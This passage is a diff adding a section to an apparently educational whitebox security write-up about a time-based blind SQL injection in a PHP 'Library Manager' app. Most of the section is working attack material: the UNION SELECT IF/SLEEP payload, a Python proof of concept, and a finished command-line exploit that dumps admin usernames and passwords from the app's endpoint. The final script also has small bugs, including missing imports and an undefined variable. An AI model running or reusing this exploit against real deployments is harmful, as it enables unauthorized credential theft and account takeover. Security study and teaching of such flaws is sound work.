@@ -340,6 +340,282 @@ inject' AND 1337=31337 union all select "HelloFriend" -- kamahamaha
 
 ![](/assets/images/webwb/injection.png)
 
+# Exploiting SQL Whitebox Style
+In this section we will exploit the discovered blind SQL injection and write a python exploit.
+
+## Can't Write a Webshell
+If we were to have hosted this on Windows, we could simply inject into the `SELECT` statement and write a PHP webshell to the file system. Trying this in the MySQL CLI, we can see that on Linux this will not work. The `mysql` user does not have permissions to write to the Apache web servers path by default:
+
+![](/assets/images/webwb/sqlError.png)
+
+## Looks Like Sleep Based Blind SQL it is!
+Since we cannot write a webshell for RCE, lets exploit Blind SQL Injection. We'll use our injection point to inject a `UNION SELECT` statement that will read the admins password.
+
+## Looking in "the back of the book" for SQL Answers
+We save some time, and just use the MySQL CLI to enumerate what the admin credentials table name is, and what the columns are:
+
+![](/assets/images/webwb/enumAdminTable.png)
+
+We see that the admin credential table is named `admin` and the passwords are stored in the `password` column. The admin's usernames are stored in the `adminName` column.
+
+At this point we know that our injection statement looks like this:
+```sql
+SELECT returnDate from borrow where borrowId = '{INJECTION}';
+```
+
+We also see that the injectable query returns only 1 column `returnDate` from the `borrow` table. Therefor our `UNION SELECT` must also only return 1 column. For good practice, we will make sure that our `borrowId` injection parameter is false so only 1 value is returned.
+
+## Sleep for Passwords
+
+We will use an `IF()` statement in our union query to check if we discovered the target character of the admins password. If we did guess the charater of the admins password correctly, the SQL database will sleep for 1 second.
+
+Our Blind SQL Injection payload to read administrators password so far:
+```sql
+SELECT returnDate from borrow where borrowId = 'inject' UNION SELECT IF(SUBSTRING(password,1,1) = '{CHAR-WE-ARE-GUESSING}',sleep(1),null) FROM admin WHERE adminId=1;
+```
+
+When we guess that the first letter of the password for admin #1 is '2', the response is returned in `0.001` seconds.
+
+When we guess that the first letter of the password for admin #1 is '1', the response is returned in `1.001` seconds. Using this method we can enumerate all the charaters of the admins password.
+
+![](/assets/images/webwb/blindtimeguess.png)
+
+## Testing our Sleep Payload in BurpSuite
+
+Testing our payload in BurpSuite, we experience the same thing, a 1 second delay when we guess the first character of the admins password correctly:
+
+![](/assets/images/webwb/1secDelay.png)
+
+## Simple PoC To Exploit Sleep for Answers
+We know all information points to build our exploit. First we'll build and test that our exploit can determine when we hit a sleep (the right character).
+
+This is the PoC I Built:
+```python
+import requests
+from colorama import Fore as F
+from colorama import Back as B
+from colorama import Style as S
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+# POST /LibraryManagement/fine-student.php
+# inject' UNION SELECT IF(SUBSTRING(password,1,1) = '1',sleep(1),null) FROM admin WHERE adminId=1; -- kamahamaha
+def sqliPayload(char,position,userid,column,table):
+    sqli  = 'inject\' UNION SELECT IF(SUBSTRING('
+    sqli += str(column)+','
+    sqli += str(position)+',1) = \''
+    sqli += str(char)+'\',sleep(2),null) FROM '
+    sqli += str(table)+' WHERE adminId='
+    sqli += str(userid)+'; -- kamahamaha'
+    return sqli
+
+chars = [ 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o',
+          'p','q','r','s','t','u','v','w','x','y','z','A','B','C','D',
+          'E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S',
+          'T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7',
+          '8','9','@','#']
+
+def postRequest(URL,sqliReq,char,position):
+    sqliURL = URL
+    params = {"check":1,"id":sqliReq}
+    req     = requests.post(url=sqliURL, data=params, verify=False, proxies=proxies,timeout=10)
+    print("{} : {}".format(char,req.elapsed.total_seconds()))
+
+def theHarvester(target,CHARS,url):
+    print("Retrieving: {} {} {}".format(target['table'],target['column'],target['id']))
+    position = 1
+    theHarvest = ""
+    while position < 5:
+        for char in CHARS:
+            sqliReq = sqliPayload(char,position,target['id'],target['column'],target['table'])
+            postRequest(url,sqliReq,char,position)
+        position += 1
+    return theHarvest
+
+if __name__ == "__main__":
+    HOST  = "http://localhost"
+    PATH  = HOST+"/LibraryManagement/fine-student.php"
+    adminPassword  = { "id":"1", "table":"admin", "column":"password"}
+    adminPass = theHarvester(adminPassword,chars,PATH)
+```
+
+You may need to install the module dependencies:
+```bash
+python3 -m pip install requests
+python3 -m pip install colorama
+python3 -m pip install argparse
+```
+
+We will also be running this through BurpSuite proxy at this point in our exploit development.
+
+Running the exploit, we see that when we guess the correct charater of the password, the time delay will be >1 second:
+
+![](/assets/images/webwb/getChar1.png)
+
+Look at that! Its the first char of the admin's password `1`!
+
+At this point we could simply dump the password like this:
+
+![](/assets/images/webwb/dumpPass.png)
+
+## Add some 1337 to that Sploit
+Now that we have it returning the password, lets make it more user friendly.
+
+### Create a Help menu with ArgParse:
+
+![](/assets/images/webwb/helpMenu.png)
+
+### Code for the final exploit:
+- Make sure to come up with some ASCII art ;)
+```python
+import requests,argparse
+from colorama import (Fore as F, Back as B, Style as S)
+
+BR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT
+def bullet(char,color):
+    C=FB if color == 'B' else FR if color == 'R' else FG
+    return SB+C+'['+ST+SB+char+SB+C+']'+ST+' '
+info,err,ok = bullet('-','B'),bullet('!','R'),bullet('+','G')
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+# POST /LibraryManagement/fine-student.php
+# inject' UNION SELECT IF(SUBSTRING(password,1,1) = '1',sleep(1),null) FROM admin WHERE adminId=1; -- kamahamaha
+def sqliPayload(char,position,userid,column,table):
+    sqli  = 'inject\' UNION SELECT IF(SUBSTRING('
+    sqli += str(column)+','
+    sqli += str(position)+',1) = \''
+    sqli += str(char)+'\',sleep(1),null) FROM '
+    sqli += str(table)+' WHERE adminId='
+    sqli += str(userid)+'; -- kamahamaha'
+    return sqli
+
+chars = [ 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o',
+          'p','q','r','s','t','u','v','w','x','y','z','A','B','C','D',
+          'E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S',
+          'T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7',
+          '8','9','@','#']
+
+def postRequest(URL,sqliReq,char,position,pxy):
+    sqliURL = URL
+    params = {"check":1,"id":sqliReq}
+    if pxy:
+        req = requests.post(url=sqliURL, data=params, verify=False, proxies=proxies,timeout=10)
+    else:
+        req = requests.post(url=sqliURL, data=params, verify=False, timeout=10)
+    #print("{} : {}".format(char,req.elapsed.total_seconds()))
+    return req.elapsed.total_seconds()
+
+def theHarvester(target,CHARS,url,pxy):
+    #print("Retrieving: {} {} {}".format(target['table'],target['column'],target['id']))
+    position = 1
+    theHarvest = ""
+    while position < 8:
+        for char in CHARS:
+            sqliReq = sqliPayload(char,position,target['id'],target['column'],target['table'])
+            if postRequest(url,sqliReq,char,position,pxy) > 1:
+                theHarvest += char
+                break;
+        position += 1
+    return theHarvest
+
+class userObj:
+    def __init__(self,username,password):
+        self.username = username
+        self.password = password
+
+class tableSize:
+    def __init__(self,sizeU,sizeP):
+        self.sizeU = sizeU
+        self.sizeP = sizeP
+        self.uTitle = "Admin Usernames"+" "*(sizeU-15)+BR+" "+ST
+        self.pTitle = "Admin Passwords"+" "*(sizeP-15)+BR+" "+ST
+    def printHeader(self):
+        width = self.sizeU+self.sizeP+3
+        print(BR+" "*width+ST)
+        print(self.uTitle,self.pTitle)
+        print(BR+" "*width+ST)
+
+def printTableRow(user,size):
+    username = user.username
+    unLen = len(username)
+    if unLen < size.sizeU:
+        username = username+(" "*(size.sizeU - unLen))
+    else:
+        name = name[:size.sizeU]
+    username += BR+" "+ST
+    password = user.password
+    pLen = len(password)
+    if pLen < size.sizeP:
+        password = password+(" "*(size.sizeP - pLen))
+    else:
+        password = password[:size.sizeP]
+    password  += BR+" "+ST
+    print(username,password)
+
+
+def sig():
+    SIG  = SB+FY+"         .-----.._       ,--.\n"
+    SIG += FY+"         |  ..    >  ___ |  | .--.\n"
+    SIG += FY+"         |  |.'  ,'-'"+FR+"* *"+FY+"'-. |/  /__   __\n"
+    SIG += FY+"         |      </ "+FR+"*  *  *"+FY+" \   /   \\/   \\\n"
+    SIG += FY+"         |  |>   )  "+FR+" * *"+FY+"   /    \\        \\\n"
+    SIG += FY+"         |____..- '-.._..-'_|\\___|._..\\___\\\n"
+    SIG += FY+"             _______"+FR+"github.com/boku7"+FY+"_____\n"+ST
+    return SIG
+
+def argsetup():
+    about  = SB+FT+'Unauthenticated Blind Time-Based SQL Injection Exploit - Library Manager'+ST
+    parser = argparse.ArgumentParser(description=about)
+    parser.add_argument('targetHost',type=str,help='The DNS routable target hostname. Example: "http://0xBoku.com"')
+    parser.add_argument('DumpXAdmins',type=int,help='Number of admin credentials to dump. Example: 5')
+    parser.add_argument('-p','--proxy',type=str,help='<127.0.0.1:8080> Proxy requests sent')
+    args = parser.parse_args()
+    if args.proxy:
+        regex = '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{2,5}$'
+        if re.match(regex,args.proxy,re.IGNORECASE):
+            args.proxy = {'http':'http://{}'.format(args.proxy),'https':'https://{}'.format(args.proxy)}
+        else:
+            print('{}Error:   Supplied proxy argument {} fails to match regex {}'.format(err,args.proxy,regex))
+            print('{}Example: {} -p "127.0.0.1:8080"'.format(err,sys.argv[0]))
+            sys.exit(-1)
+    else:
+        proxy = False
+    return args
+
+if __name__ == "__main__":
+    header = SB+FT+'               '+FR+' Bobby '+FR+'"'+FR+'boku'+FR+'"'+FR+' Cooke\n'+ST
+    print(header)
+    print(sig())
+    args   = argsetup()
+    host   = args.targetHost
+    pxy    = args.proxy
+    admins = args.DumpXAdmins
+    PATH   = host+"/LibraryManagement/fine-student.php"
+    size  = tableSize(20,20)
+    size.printHeader()
+    dumpnumber = 1
+    while dumpnumber <= admins:
+        adminUsername  = { "id":dumpnumber, "table":"admin", "column":"username"}
+        adminUsername  = theHarvester(adminUsername,chars,PATH,pxy)
+        adminPassword  = { "id":dumpnumber, "table":"admin", "column":"password"}
+        adminPass = theHarvester(adminPassword,chars,PATH,pxy)
+        adminUser = userObj(adminUsername,adminPass)
+        printTableRow(adminUser,size)
+        # print("Admin's Username is: {}".format(adminUsername))
+        # print("Admin's Password is: {}".format(adminPass))
+        dumpnumber += 1
+```
+
+Running the exploit we are able to dump the admin's crendentials table!
+
+![](/assets/images/webwb/dumpAdmins.png)
+
+Using the MySQL CLI we confirm that our exploit properly dumps the admin credentials:
+
+![](/assets/images/webwb/cliDump.png)
+
+
 ## Discovering Broken Access Control
 Another quick win is checking if the webpages check for session authentication before allowing access to the resource. This is a common vulnerability and has been categoried by OWASP as [A5:2017-Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control). These vulnerabilities typically requiring a developer or code reviewer to know which pages are supposed to be public, and which require access controls. For this reason, SAST scanners are poor at detecting these vulnerabilities, and they can slip by undiscovered in a secure SDLC, right into production.
 
